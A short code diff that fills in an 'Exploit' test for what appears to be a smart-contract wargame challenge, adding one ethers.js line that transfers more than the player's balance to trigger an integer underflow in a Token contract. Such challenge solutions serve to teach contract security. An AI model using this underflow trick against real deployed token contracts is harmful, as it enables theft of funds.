@@ -18,7 +18,8 @@ describe("Token", async function () {
     });
 
     it("Exploit", async function () {
-
+        // Overflow
+        await instance.connect(player).transfer(ethers.constants.AddressZero, (await instance.connect(player).balanceOf(player.address)).add(1));
     });
 
     after(async function () {
